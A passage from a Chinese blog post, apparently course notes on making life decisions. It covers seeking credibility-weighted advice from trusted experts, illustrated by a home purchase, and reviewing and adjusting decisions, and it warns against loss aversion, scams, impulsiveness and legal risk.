class="line">我2018年5月写了一篇文章提及此事，叫做“竞价排名永不倒”，当时踩踏还没有发生，被我准确预言，有兴趣的可以搜搜看。</span><br><span class="line"></span><br><span class="line">这时我投资方面少有的正确决策，但是依然存在极大的运气成分和幸存者偏差在里面。那么今天复盘这个逻辑，也是希望大家能理解，一个高风险投资决策的过程，大概应该是怎样的。</span><br></pre></td></tr></table></figure>
<h3 id="嘉宾时刻"><a href="#嘉宾时刻" class="headerlink" title="嘉宾时刻"></a>嘉宾时刻</h3><h4 id="粥左罗"><a href="#粥左罗" class="headerlink" title="粥左罗"></a>粥左罗</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主要就讲两个词：可信人和可信度加权，其实说的就是一个事情的两个面，核心就是“可信”。</span><br><span class="line"></span><br><span class="line">01</span><br><span class="line">可信人</span><br><span class="line"></span><br><span class="line">我先说一个结论：绝大多数人的决策，都极其糟糕，因为他们征求建议做决策时，都找错了人。</span><br><span class="line"></span><br><span class="line">我们接受的教育里，有一条错误决策原则根深蒂固的植入在我们心中，那就是：做重要决策时，要征求下大家的建议。</span><br><span class="line"></span><br><span class="line">为什么错误呢？</span><br><span class="line"></span><br><span class="line">因为大多数人，都不可信。</span><br><span class="line"></span><br><span class="line">我做很多事，都不会参考“大家的建议”。</span><br><span class="line"></span><br><span class="line">但我也不会“独自决策”，因为我会始终提醒自己：</span><br><span class="line"></span><br><span class="line">我是在寻找最好的决策，而不是自己能得出的最好决策。</span><br><span class="line"></span><br><span class="line">我会找少数人，少数可信人，让他们给我建议。</span><br><span class="line"></span><br><span class="line">什么是可信人？</span><br><span class="line"></span><br><span class="line">整体上，他们可以不断的取得成就，并且他们可以就自己如何做到的，有很好的解释。局部上，他们在你想咨询的领域同样有过成功经历，并且有很好的解释。你想得到一样东西，就要去找到那些已经得到了这些东西的人学习。</span><br><span class="line"></span><br><span class="line">但我是一个小白，对买房一无所知，我还不能自己做决策。</span><br><span class="line"></span><br><span class="line">怎么办？</span><br><span class="line"></span><br><span class="line">找可信人。</span><br><span class="line"></span><br><span class="line">我非常熟的朋友里，买过房的，城市、位置、总价特别匹配我需求的，几乎没有。</span><br><span class="line"></span><br><span class="line">怎么办？</span><br><span class="line"></span><br><span class="line">我想到一个办法，我在知识星球上，搜索讲北京房产的知识星球，判断靠谱的，我都付费加入。然后每个星球，我每天花固定时间，读一下他们的精华分享和问答。</span><br><span class="line"></span><br><span class="line">我发现如获至宝，为什么呢？</span><br><span class="line"></span><br><span class="line">如果我咨询我买过房的朋友，很可能他这辈子就买过那一次，自己也没研究过很多，买好买坏运气成分也有不少。</span><br><span class="line"></span><br><span class="line">而这些星主，每年踩盘几百套，每年帮助很多人买房成功，他们的知识、信息、经验、判断的可信度是非常高的。</span><br><span class="line"></span><br><span class="line">而且，你可以用关键词检索。</span><br><span class="line">比如，我想知道东湖湾这个小区怎么样，我搜索东湖湾，我加入的这些星球里所有提到东湖湾的帖子，都会出来，我挨个看下来，就非常了解了。</span><br><span class="line"></span><br><span class="line">比如，我搜索中介费，我就把所有提问中介费的问题都找出来了，北京各大中介可以给到的最低点我摸得非常清楚。</span><br><span class="line"></span><br><span class="line">比如，如何砍价，技巧和注意事项分别是什么，如何因人而异做砍价策略，我拿到很多案例。</span><br><span class="line">这些信息，对我帮助极大，让我最后交易的时候，像一个专家一样。价格我砍到了这两年同小区成交的最低价，比当年同一栋楼同户型的另一套房少花了65万。链家中介费，我拿到了2.2％，是我知道普通人能谈到的最低点。</span><br><span class="line"></span><br><span class="line">这是可信人和可信信息。</span><br><span class="line"></span><br><span class="line">02</span><br><span class="line">可信度加权</span><br><span class="line">我再说一下，可信度加权。</span><br><span class="line"></span><br><span class="line">什么意思？</span><br><span class="line"></span><br><span class="line">第一，你不能找一个可信人，你要找多个可信人。</span><br><span class="line"></span><br><span class="line">第二，你要综合多个可信人的建议。</span><br><span class="line"></span><br><span class="line">第三，即便都是可信人，可信度也有高低之分，如果按投票来说，不能按一人一票来算，有的人可信度更高，他一人可以有三票，有的人可信度低些，可以按0.5票。</span><br><span class="line"></span><br><span class="line">比如，我买房时，看了一百多套房子后，选了大概9套房子。</span><br><span class="line"></span><br><span class="line">然后，我写了一段信息：</span><br><span class="line"></span><br><span class="line">我认真看房一百多套，总预算在多少钱，筛选了一些，诚心求教，希望您指点一下，帮忙排序一下（全排），感谢老师！</span><br><span class="line"></span><br><span class="line">1、</span><br><span class="line">2、</span><br><span class="line">3、</span><br><span class="line">….</span><br><span class="line">9</span><br><span class="line"></span><br><span class="line">（每套后面有基本信息，小区，楼层，朝向，面积，单价，建成时间等。）</span><br><span class="line"></span><br><span class="line">然后，我挨个提问我认为靠谱的星主，有多个是我加到他们微信，微信发大红包提问。</span><br><span class="line"></span><br><span class="line">所有人都回答后，我再综合排。</span><br><span class="line"></span><br><span class="line">综合排的时候，我会模糊性的加权，有的人是纯投资派，我会降权一点，因为我会长期自住，有的人是讨厌学区派，他们排学区房时都会倾向往后排，这点我要综合看，因为这个事我研究了很多可信人，其实得不到共识。</span><br><span class="line"></span><br><span class="line">当然，还会努力平衡个人偏好，我并不一定非买前三名不可，因为我还要考虑自己的偏好，比如我对视野开阔尤其偏好，但我也不会买后三名，当多个可信人都认为某个选择不对时，我不会认为我是世界上最聪明的人。</span><br><span class="line"></span><br><span class="line">所以，我们既不能不区分可信度的参考所有人，也不能不合逻辑的高估自己的可信度。</span><br><span class="line"></span><br><span class="line">比如我在决定要买哪个后，要给链家的中介一个预期价格。</span><br><span class="line"></span><br><span class="line">第一，我不会马上给。我会反问对方，你们是专业的，我花钱请你们帮我买到合适的房子，请你们给我一个参考，这个房子多少拿下是合理的。他们会给出一个价格。</span><br><span class="line"></span><br><span class="line">第二，我会换个账号登陆贝壳，找机会跟卖方的经纪人探寻底价，以及卖方的其他真实信息。</span><br><span class="line">第三，我会把我掌握的有效信息发给我认识几个高可信度的星主，问他们这个房子多少钱拿下是合理的。</span><br><span class="line"></span><br><span class="line">我知道真实基本底价后，我在那基础上再大减50万，报给中介，中介再报给卖方中介，卖方中介再报给卖家。最后，基本确定，我这个价格是不合理的。我死守这个，是无法成交的。我于是在心里调整预期，但我绝不改口，又约了面谈。面谈过程中，我得到了新的关键信息，我知道虽然我这个价格虽然不能成交，但对方死守的底价我找到了破的可能，当时故意没谈，各自回家，然后我再让中介去谈，最终以很合适的价格拿下了。</span><br><span class="line"></span><br><span class="line">我跟女朋友复盘整个决策过程，关键在于，各个维度上，我们都找到可信人拿到可信信息，我们方方面面做到了心中有数，所以才能顺利买房。</span><br><span class="line"></span><br><span class="line">人的决策，基本分为两种决策方式，一种是以证据和逻辑为基础，另一种是以潜意识和情绪为基础。</span><br><span class="line"></span><br><span class="line">如果你能做到更多的是以第一种方式做决策，你就比70%的人强，因为大多数人就算是关键决策也是稀里糊涂的。但做到了第一种，还有很大的进步空间，因为以证据和逻辑为基础，做好的前提是，你知道从何处获得以及如何获得证据和逻辑，当然是从可信人那里获得，以可信度加权的方式获得，这样你就比90%的人强。</span><br><span class="line"></span><br><span class="line">我今天的举例用的高考和买房，但关键决策一生有很多，比如投资决策，你这一生要经历很多次，职业选择，也要经历很多次，甚至城市选择这一生也要有好几次，并不是一辈子都在一个城市，等等很多决策，都有持续深远的影响，所以大家今后要认真对待每一次关键决策。</span><br><span class="line"></span><br><span class="line">我希望大家以后每次做关键决策时，都能想起，曾经有一天，有个叫粥左罗的，分享过两个关键词，一个叫可信人，一个叫可信度加权，你每次要能想到这个，可能都能提高你的决策质量。</span><br><span class="line"></span><br><span class="line">问题：日常生活怎么可以更好地训练自己的决策能力？这种重大场景并不是经常出现的</span><br><span class="line">回答：多一些理性和逻辑，少一些感性和情绪。</span><br><span class="line"></span><br><span class="line">问题：请问曹大：做关键决策的时间是不是也不能拖太久，导致失去某些机会。这种度要如何拿捏呢？像帅张老师说的这种情况——就怕看完一百多套，房价又暴涨了，没来及买</span><br><span class="line">回答：会有这情况，一切要靠自己判断和取舍。而且不要求全责备，你不可能总是买在最低点，也不可能卖在最高点。</span><br><span class="line"></span><br><span class="line">荐书：</span><br><span class="line">很多书都是锻炼逻辑思考和人性思考的：适合产品经理的十本书： 社会心理学 阿伦森 第一本经济学 学会提问 认知心理学及其启示 思考快与慢 超越智商 思维与决策 经济学原理 错误的行为：行为经济学的形成 新制度经济学；推荐一本书《引爆点》，讲的是如何引发一场潮流，对人性的理解以及营销都有很多启发；谈判推荐这本书：《谈判是什么》盖温肯尼迪著，中国宇航员出版社，2018年出了新版，改名《谈判》，民主与建设出版社：https://m.douban.com/book/subject/30203275/</span><br></pre></td></tr></table></figure>
<h2 id="回顾第一课"><a href="#回顾第一课" class="headerlink" title="回顾第一课"></a>回顾第一课</h2><p>我们上一节讲的是如何制定决策，那么决策如果是错的，或者不是最优的，是不是就完蛋了呢。</p>
<p>有两点请大家务必记住。</p>
<p>第一，人生不止一个关键决策，不止一个机会，绝大部分情况下，你有其他的选择机会。学会拥抱变化是人生的一部分。</p>
<p>第二，错误的决策，或者没有选择最优决策，未必一定是坏的结果，凡事都有两面。</p>
<p>首先，要学会不断反思，复盘。正如前面所提，如果从不觉得自己之前的判断和决策傻逼过，那肯定是不可救药的大傻逼。有错误，有问题，是正常的，发现问题，找到原因，是成长的一部分。认知的成长，有助于在后续决策中，做出正确的选择。</p>
<h2 id="人生决策的四种类型"><a href="#人生决策的四种类型" class="headerlink" title="人生决策的四种类型"></a>人生决策的四种类型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">最优决策，顾名思义，最佳的选择路线，但说实话，能做到的是极少数，甚至我们即便严谨复盘，也可能无法发现什么才是当时的最优决策。</span><br><span class="line"></span><br><span class="line">正向决策，长期来说，对个人成长，价值提升是正向的。但正向决策也存在很大的差异，比如15年前两份offer摆在面前，一份是腾讯，一份是华为，那么正常情况下，这两个选择都是正向选择，但不同选择的收益差异，却可能是非常巨大的。</span><br><span class="line"></span><br><span class="line">也就是，我们要追求在正向决策中倾向于最优决策的路线。</span><br><span class="line"></span><br><span class="line">负向决策，长期来说，对个人成长，价值提升是负向的。比如有人从一个很有前途的公司跳槽到一个资金盘的公司，然后钱没赚到还惹了一身麻烦。</span><br><span class="line"></span><br><span class="line">灾难决策，导致无可挽回的灾难局面。</span><br><span class="line"></span><br><span class="line">比如，欠一大笔赌债，或被杀猪盘骗的一无所有负债累累。</span><br><span class="line">比如，做严重违法的事情，深陷牢狱之灾。</span><br><span class="line">比如，做出肮脏丑陋的事情被曝光，遭遇行业封杀、社会性死亡。</span><br><span class="line">比如，因一意孤行导致家庭破裂或亲人丧生，追悔莫及。</span><br><span class="line">比如，酒驾导致严重交通事故，导致身体残疾。</span><br><span class="line"></span><br><span class="line">我们关键决策追求的目标是，在保证做出正向决策的同时，尽可能靠近最优决策。</span><br><span class="line"></span><br><span class="line">我们很难做到最优决策，但做到正向决策却不难，甚至于，普通人的大部分决策都是正向决策，比如你坚持读书学习，去报考大学，争取选择更好的offer，都是正向决策，我们的目标是达到最优决策，但这个很难，那么维持正向决策，不断向最优决策靠拢，是我们的目标。</span><br><span class="line"></span><br><span class="line">在很多时候，我们所认为的错误决策，其实只是正向的程度不够，离最优决策距离有点远。比如在诸多offer中没有选择到成长最快，长期回报最高的企业。比如过早的卖出了重要资产，踏空了大幅的增值空间。这些其实都不是负向决策，但确实都存在进一步优化的空间。</span><br><span class="line"></span><br><span class="line">同时，要尽力避免负向决策，不要被坑，被骗，不要以个人信用为代价换取蝇头小利，要有法律观点和道德底线等等。</span><br><span class="line"></span><br><span class="line">灾难决策是很难挽救的，可能需要很长时间弥合创伤，很长时间的自我恢复。我希望我的读者不要出现这样的决策，真的真的承担不起。</span><br><span class="line"></span><br><span class="line">而做出灾难决策，往往是一时冲动，以及对风险不以为然。。。</span><br><span class="line"></span><br><span class="line">我相信这里的读者大部分应该自己没有经历过灾难决策，都可以复盘一下，自己不满意的关键决策里，哪些是正向的，哪些是负向的。</span><br></pre></td></tr></table></figure>
<h2 id="谈谈过于决策的复盘"><a href="#谈谈过于决策的复盘" class="headerlink" title="谈谈过于决策的复盘"></a>谈谈过于决策的复盘</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">复盘是什么，</span><br><span class="line"></span><br><span class="line">首先，要看你决策后的发展预期，是否和现实一致。比如你投资的回报，是否和你预计一致。比如你选择的职业和工作，是否符合你原本的预期。比如你创业设计的项目上线，用户的反馈，获客成本，团队组建，成本开销等等，是否与你计划一致。</span><br><span class="line"></span><br><span class="line">如果不符合，原因是什么，是否有自己之前未考虑，未明确的地方，或者判断错误的地方。</span><br><span class="line"></span><br><span class="line">其次，看市场及社会环境的变化，客观条件的变化，你之前做出决策的客观条件，市场环境是否还在维持，还是有了较大的变化，计划没有变化快是很常见的。意想不到的市场变化很容易带来自己计划的失败。</span><br><span class="line"></span><br><span class="line">第三，不断反思自己认知上的误区，扩展视野边界，也许你之前的决策是当时认知中的最佳选择，但是你的认知提升了，视野提升了，资源提升了，你就应该想想，也许存在更好的决策。</span><br><span class="line"></span><br><span class="line">第四，即便一切顺利，也要不断追寻细节，是否存在可能遗漏的风险和危机点。</span><br><span class="line"></span><br><span class="line">比如，有那种早期加入巨头的，很好的选择，待遇和职位都还不错，人生也没什么苛求了，觉得一切都好。但是巨头老板要年轻化，要革命，要淘汰老白兔，很不幸，40来岁下岗了，这种还能去做什么呢？</span><br><span class="line"></span><br><span class="line">一切顺利也是存在隐患和危机的，随时要用心体会，用心挖掘，给自己多一些选择，多一些后路。</span><br><span class="line"></span><br><span class="line">还有很多投资者、创业者不懂得见好就收，可能做出了成功的投资决策和创业决策，但没有能及时收手，在市场环境剧烈变化的时候，因为厌恶损失，不断投入，最后一步步坠落到灾难决策。</span><br><span class="line"></span><br><span class="line">这样的案例是很多的，为什么一些上市公司老板最后身陷囹圄。身价多少亿的时候，过于自信，失去了自我认知，市场逆转的时候，不断地试图挽救，最后铤而走险，做出灾难决策，导致自己失去自由。</span><br><span class="line"></span><br><span class="line">不断复盘，总结之前决策的成败得失，第一是可以针对性的做出调整和改变。第二是有助于提升新的决策能力。</span><br></pre></td></tr></table></figure>
<h2 id="谈谈关于决策调整"><a href="#谈谈关于决策调整" class="headerlink" title="谈谈关于决策调整"></a>谈谈关于决策调整</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">复盘不代表一定要推翻决策，但根据复盘的心得，对决策可能需要做出一定的调整。</span><br><span class="line"></span><br><span class="line">第一，优化决策</span><br><span class="line"></span><br><span class="line">如果发现之前的决策结果，符合预期，甚至优于预期，但早期决策可能更多是方向上的，那么后续就应该有细化，或者更明确的调整。</span><br><span class="line"></span><br><span class="line">比如工作决策选择某个岗位offer，并且指定了发展规划，进来之后发现确实不错，上司给力，同事都很融洽，那么下一步就应该细化这个规划，跟领导聊聊，是否有自己没想明白的地方，是否还有哪里可以提升，以及市场是否有新的变化，自己的发展规划是否应该与时俱进。</span><br><span class="line"></span><br><span class="line">再正确的决策，也要不断迭代，来适应时代的变化。不要墨守陈规，觉得自己当年判断决策挺准的，就不再反思和调整了。</span><br><span class="line"></span><br><span class="line">第二，改变和调整决策</span><br><span class="line"></span><br><span class="line">市场环境发生了改变，或者虽然选对了方向，但发展远远达不到预期，这时候可能涉及改变决策。</span><br><span class="line"></span><br><span class="line">列举一些常见的决策改变</span><br><span class="line"></span><br><span class="line">更务实，摈弃一些好高骛远的目标，学会更好的理解所掌握的资源和能力局限，学会在有限资源，有限能力下做出最好的成果，这是一种常见的决策调整。</span><br><span class="line"></span><br><span class="line">个人方向调整，比如在一个新公司，觉得公司发展前途很好，但自己的发挥空间有限，那么寻求公司内部调动的机会，寻求更好的发展空间。这也很常见。</span><br><span class="line"></span><br><span class="line">修改商业模式，比如创业过程中，虽然用户指标达到了预期，但收入指标远远达不到预期，也许是模式产生了偏差，通过请教业内的懂行人士，以及基于用户行为的深度分析，调整商业模式，改变收入路径，突破困境。</span><br><span class="line"></span><br><span class="line">横向拓展，发现新兴领域与自己核心业务具有高度的关联性，快速调整，横向拓展，覆盖新兴领域，搭上市场顺风车。</span><br><span class="line"></span><br><span class="line">基于条件转变，比如创业公司招聘中发现一个超级牛人，有自己深刻的想法，或者在商业合作洽谈中发现有一个非常有潜力的合作伙伴，提供了令人无法拒绝的资源，那么基于新的资源新的竞争优势，对创业方向进行改变和调整。</span><br><span class="line"></span><br><span class="line">改变和调整是很常见的，但并不是说你看到了什么好的方向，好的领域，就一定要调整，我见过一些创业者，确实思维敏捷，市场敏锐度高，但是改变和调整实在太频繁，做了很长时间，看上去什么风口都可以去抓，最后没有积累。</span><br><span class="line"></span><br><span class="line">这里要强调一点，就是改变和调整虽然很多时候是有必要的，但请随时保持一定的积累。保持自身能力、价值的增长，尽量选择做有积累的事情。</span><br><span class="line"></span><br><span class="line">第三，推翻和放弃决策</span><br><span class="line"></span><br><span class="line">如果发现市场环境的改变，或者基于认知的提升，发现原有的决策所处的逻辑基础不再存在，或者发现原有的机会已经失去，要有坚决止损的决心。</span><br><span class="line"></span><br><span class="line">很多时候，甚至可以说非常高的比例的情况下，人们之所以陷入困境，并不是因为做出了错误的决策，而是在有机会脱身的时候，没有止损。所谓投资高手，或者所谓一些顶尖牛人，他们决策的成功率未必高于普通人，但他们能够把决策错误的损失降到最低，而把决策正确的收益坚持到最大。</span><br><span class="line"></span><br><span class="line">认知提升可以纠正很多错误决策，然后呢，就是快速止损。</span><br><span class="line"></span><br><span class="line">损失厌恶心理是人们常见的心理特征，很多人因为产生了损失，试图弥补损失而做出更荒谬的决策，从而造成更大的损失，杀猪盘游戏也是利用这个心理，不断地榨干受害人的所有积蓄，而现在，更残忍，榨干受害人在各个平台的信贷额度。</span><br><span class="line"></span><br><span class="line">灾难性决策往往是一时上头触发的，在损失厌恶的心理驱动下，人们很容易失去理智判断的能力。</span><br><span class="line"></span><br><span class="line">通常，我们做出负向决策是一个糟糕的体验，但其实往往不致命，然而，如果因为厌恶损失，从而在错误决策上越走越远，就可能导致灾难性决策，绝大部分灾难性决策，都是这样演进的。</span><br><span class="line"></span><br><span class="line">第四，坚持正确的决策</span><br><span class="line"></span><br><span class="line">这里再提一个非常关键的心得，就是坚持正确的事情，其实也很难。</span><br><span class="line"></span><br><span class="line">有人说，坚持正确的事情怎么会难呢，我举个例子，比如你有10%的几率博取20倍的回报，你会不会投入？从概率统计来说，这就是正确的事情，第一次投入，失败了，第二次投入，失败了，第三次，你还会投入么？很多人就退缩了，不要说你，我也是，而且很多次，没有坚持正确的决策。</span><br><span class="line"></span><br><span class="line">正确的决策，未必立即会有正确的结果，因为很多事情，并不是你决策正确就一定可以获得回报的，或者这个回报周期可能会比较长，很多人，做出了正确的决策，但受到了一些挫折，然后就退缩了，那么其实再坚持一下，可能就是非常光明的前程，就在黎明前的一刻，退缩了。</span><br><span class="line"></span><br><span class="line">复盘的意义就在于此，你复盘得失成败的时候，要知道什么是对的，什么是错的，比如你投资一个企业股票，市场环境是否变化了，企业产品竞争力是否变化了，企业人力资源是否变化了，企业价值逻辑是否变化了，你对行业的认知是否变化了，你推断下来，发现虽然有所变化，但并没有发现根本利空的变化，而这个企业因为某些市场环境波动，股票下跌了，那么，你敢坚持正确么？</span><br><span class="line"></span><br><span class="line">或者你发现，确实产生了一些不利的变化，但你厌恶损失，不想止损，还想再等等看，这就是上一段提到的问题。</span><br><span class="line"></span><br><span class="line">决策就是这样，很多时候你很纠结，不知道自己是对是错，但你要建立自己的判断逻辑和价值逻辑，然后基于此做出决断，并承担自己决断的后果。</span><br></pre></td></tr></table></figure>
<h2 id="做好当下，机会无处不在"><a href="#做好当下，机会无处不在" class="headerlink" title="做好当下，机会无处不在"></a>做好当下，机会无处不在</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">错误的决策，未必一定都是非常糟糕的结局。正确的决策，也未必能达到正确的彼岸。</span><br><span class="line"></span><br><span class="line">怎么理解呢，比如你选择工作，一时被人忽悠，放弃了一个很好的巨头工作，选择了一个不靠谱的，必然失败的创业公司，按说，这是一个错误决策，但如果你在这个创业过程中，全身心投入，把所有踩过的坑，犯过的错，以及得到的经验教训都整理清楚，这个成长的收获，可能会大于你在一个很好的巨头里按部就班的工作经历，如果你不气馁，不丧，那么后续还有很大机会，在其他工作机会上，体现自己的价值，一个经历过创业惨痛教训并能够认真反思总结的人，在职场上往往具有更全面的视野和更高的格局，更可以胜任一些开创性的管理岗位。</span><br><span class="line"></span><br><span class="line">比如你误信所谓专家推荐，投资决策，亏了一大笔钱，你当然很心疼，很绝望，但你认真分析和整理了这些套路和话术，不断反思和查询有关资料；第一增强了你后续的免疫力，防止后续被欺诈；第二提升了认知和视野，在后续的投资中能够正确控制风险边界，可能这个收获在未来会让你避免更大的损失。所以网上也有一种观点，年轻人早点被坑未必是坏事，总好过人到中年被坑的一无所有。</span><br><span class="line"></span><br><span class="line">所谓祸兮福所依，福兮祸所依，还是有一些道理的。其实很多行业大佬，巨头老板创业早期很多都有被骗，被坑的经历，还有更多好高骛远，或者错失良机的经历，网上可以搜到很多这样的八卦案例。很多时候，错误决策也是成长的一部分，如果能很好的反思，复盘和吸取教训，可能比正确决策带来的收获更大。</span><br><span class="line"></span><br><span class="line">所以，无论决策对与错，很关键的一点是，做好当下。</span><br><span class="line"></span><br><span class="line">如果决策无法更改，就要做好当下，扎扎实实做好每一步。</span><br><span class="line"></span><br><span class="line">大学没有选择正确的学校、专业，可以继续好好读书，还有双学位、考研的机会。</span><br><span class="line">工作没有选择正确的offer ，一样要好好表现，好好学习，让自己再进一步，还会有新的选择机会。</span><br><span class="line"></span><br><span class="line">不要丧，不要自暴自弃，不要因为选择错误就觉得自己前途尽毁，凡事事在人为。</span><br><span class="line"></span><br><span class="line">当然，很关键的是，不要让自己丧失了继续选择的机会，要保持拥有继续下注的筹码。</span><br><span class="line"></span><br><span class="line">这个筹码是什么呢</span><br><span class="line"></span><br><span class="line">第一，你的身体，一定要让身体健康，没有健康，没有一切。</span><br><span class="line">第二，你的信用，信用的重建是需要极高成本的，信用丧失，你再想翻身，就需要很多倍的努力。</span><br><span class="line">第三，不要欠债，资产少一点没关系，不要欠一大笔网贷！不要欠一大笔网贷！不要欠一大笔网贷！任何人让你借网贷帮他，或者让你借网贷投资，都不要应允，任何人！！！除非至亲生命危险，需要救命，否则，绝不能用自己的网贷来帮助别人。</span><br><span class="line"></span><br><span class="line">错误的决策不是末日，尽可能做好当下，然后你会遇到新的机会，做出合理的决策调整，还是能回到正确的轨道上。</span><br><span class="line"></span><br><span class="line">而且，很多时候，很多人眼里所谓错误的决策，可能也并不见得是坏的决策，可能只不过不是当时的最优决策，比如你选择了B offer，放弃了A offer，你觉得A发展更好，自己很遗憾，但其实B可能已经超过了很多其他选择。不要总是求全责备，自怨自艾。</span><br></pre></td></tr></table></figure>
<h2 id="如何避免做出坏的决策"><a href="#如何避免做出坏的决策" class="headerlink" title="如何避免做出坏的决策"></a>如何避免做出坏的决策</h2><h3 id="分不清重点，短视，缺乏格局"><a href="#分不清重点，短视，缺乏格局" class="headerlink" title="分不清重点，短视，缺乏格局"></a>分不清重点，短视，缺乏格局</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">非常常见的决策问题，比如找工作时纠缠于一些细枝末节，比如贪图一点点眼前利益做损失信用的事情。</span><br><span class="line">很多人年轻人初入职场会犯这样的错误，为了一点蝇头小利，为了一点鸡毛蒜皮，花大量的时间和精力。</span><br><span class="line">有时候我们还说不得，为啥呢，因为人家有道理啊，我吃亏了难道维权有错么，你不让我维权是不是屁股坐歪了。我不是不让你维权，而是你做出的一切得不偿失。</span><br><span class="line">真要是有重大利益损失，找个律师授权去维权，自己该干嘛干嘛去，别瞎耽误功夫，你说找律师太贵，那就算了，赶紧抓正事去。</span><br><span class="line"></span><br><span class="line">很多糟糕的决策都是因为过于关注细节，而忽视了重点。而一些割韭菜的大师们恰恰善于营造某些让你觉得愉悦的细节，从而掩盖他们的动机。</span><br><span class="line">很多老年人受骗，是因为骗子的套路和话术让他们很舒服，很愉悦，为什么亲人反而说不过骗子，因为你让他们不舒服了么。这也算暗黑版的“细节决定成败”吧。</span><br><span class="line"></span><br><span class="line">还有一些刚毕业的学生，为了工资高低一两千斤斤计较，当然人家也有道理，一两千对基层老百姓来说不是小数目了，但你的成长目标是什么，你的长远价值是什么，从五年，十年的职场发展看，什么才是最重要的。</span><br></pre></td></tr></table></figure>
<h3 id="缺乏法律意识和风险意识"><a href="#缺乏法律意识和风险意识" class="headerlink" title="缺乏法律意识和风险意识"></a>缺乏法律意识和风险意识</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">最近这些年，我朋友圈陷入牢狱之灾的有好几个，那么没有陷入牢狱之灾，但被判了缓刑的也有不少，此外，监视居住的，被边控限制出境的，躲在海外不敢回国的，都有。</span><br><span class="line">当然也有一些自己到没什么大碍，但投资或参股的项目出事，损失惨重的；合伙人被抓的；创业项目被勒令关停的；这些就非常非常多了。</span><br><span class="line">很多年轻人没这个概念，总觉得很遥远，其实一点都不遥远。</span><br><span class="line">版权问题，税务问题，隐私滥用问题，信息安全问题。</span><br><span class="line"></span><br><span class="line">说真的，我年轻的时候，其实也挺危险的，从网上搜一个安全手册，看到一些入侵的途径技巧，也不懂么，就各种扫描；学了SQL注入，就敢各处去试，也是当时互联网相对新生，传统的法律还不太关注这部分，整体社会比较纵容，要按现在的法律执行标准，我那时的行为其实也是，那个、那个很有问题的。</span><br><span class="line"></span><br><span class="line">很多时候，我们觉得自己的行为没有恶意，不是做坏事，请注意，评判的资格和标准，不是我们自己说了算的。</span><br><span class="line"></span><br><span class="line">很多创业者对内容安全没概念，对内容审核成本没概念，这种项目有一个算一个，死的很脆。这种创业决策，有一个算一个，都是坏决策。</span><br><span class="line"></span><br><span class="line">找工作的时候，不注重风险，被卷入诈骗公司，最后无法脱身，连带自己深陷囹圄的，最近这些年也有很多。</span><br></pre></td></tr></table></figure>
<h3 id="惯性思维"><a href="#惯性思维" class="headerlink" title="惯性思维"></a>惯性思维</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以为过去的表现代表未来的趋势。</span><br><span class="line">为什么那么多庞氏骗局那么容易得手，中国人口红利啊，三个月分红，六个月分红，一年分红，两年分红，好像很安全，很多人赚到钱了，很多人就会以为很安全很稳定了么。</span><br><span class="line">P2P理财也是，2017年第一波暴雷跑不掉的，这种是真的没救，为什么很多人2018不跑，2019还不跑，自己买的没暴雷，就总觉得没问题么。</span><br><span class="line">以为上涨的会一直上涨，以为历史业绩会代表未来。</span><br><span class="line"></span><br><span class="line">还有就是产业的变迁，技术的革命，很多时候，你在某个领域可能已经登峰造极，突然，降维打击来了，这个领域没了。比如说，燃油车的发动机，可能已经研究了几十年，突然，电动车来了，对不起，全部不需要了。但很多人真的没有转过弯来，他们会本能拒绝新时代，拒绝新技术，这也是一种惯性思维。</span><br><span class="line"></span><br><span class="line">我自己也要面对这个问题，我觉得自己数据库优化的经验很丰富，但现在年轻人用clickhouse，用pingcap，用很多新的技术和架构，以前的经验真的不适用了，这事要认，再倚老卖老，确实不对了。</span><br><span class="line"></span><br><span class="line">摆脱惯性思维，对每个人的认知和视野都是有很大的挑战，其实越是岁数大的人，惯性思维越严重，但有些年轻人，说真的，也会老气横秋。与时俱进不是说说而已，要做到不容易。</span><br></pre></td></tr></table></figure>
<h3 id="损失厌恶心理"><a href="#损失厌恶心理" class="headerlink" title="损失厌恶心理"></a>损失厌恶心理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">不肯止损，越输越要赌。</span><br><span class="line">之前币圈有个自杀的，就是不肯止损，越输下注越大，高杠杆试图翻本，结果爆出了天文数字的亏损，自杀了。不是穷人啊，原本是个有钱人啊。</span><br><span class="line">还有，金立手机董事长，亿万富翁，围棋高手，智商不低的，财富和身价也不低的，在塞班输出去十几亿，公司也完了，怎么输出去的，你说是不是杀猪盘我不敢乱说，但那么高的资产身价，如果肯止损，怎么会到这个境地。</span><br><span class="line"></span><br><span class="line">我也有读者反馈被杀猪盘坑的很惨的经历，越输越想回本，越陷越深。</span><br><span class="line">我以前炒股炒权证也有这样的经历，因为损失厌恶心理，亏的很惨，但所幸没有欠债。总还是有筹码在手上，总还可以继续下去，所以不至于一蹶不振。</span><br><span class="line"></span><br><span class="line">任何时候，基于当下做决策，不要把前面的损失和收益考虑在里面，该止损止损，该收手收手。</span><br></pre></td></tr></table></figure>
<h3 id="感性冲动"><a href="#感性冲动" class="headerlink" title="感性冲动"></a>感性冲动</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">很多收割韭菜的宣传活动，会营造一种氛围，很容易让用户觉得兴奋，紧张的氛围，很多人因此中招，在各种托，各种狂热氛围的衬托下，急促下单，迫不及待的上去送人头。</span><br><span class="line">最后三个，最后两个，最后一个。</span><br><span class="line">今天的价格绝对超值，错过今天，后悔一生。</span><br><span class="line">今天成为我们vip会员，明年的今天你就会拥有怎样怎样的生活，看看谁谁谁，曾经如何窘迫，加入我们团队多久购买了豪车；谁谁谁，曾经如何挣扎，加入我们团队多久购买了豪宅，你不想和他们一样么，赶紧加入，最后的机会，名额有限，马上截至。</span><br><span class="line"></span><br><span class="line">美好的宣传，倒计时的催促，一群托的衬托，各种诱惑性的前景，以及伪专家伪学者的背书。</span><br><span class="line"></span><br><span class="line">所以理性是非常重要的，拥有坚强理性思维的人，对这种场景的免疫力是很高的。实际上生活中我们也常常不理性，突然兴致起来，买一个心仪的游戏周边，或者突然想去哪里旅游，或者突然约一个老朋友去喝点酒，可能都不是理性决策。我们不是说人必须无条件理性，但我们要知道在什么场景下，不要让感性压制理性。</span><br><span class="line"></span><br><span 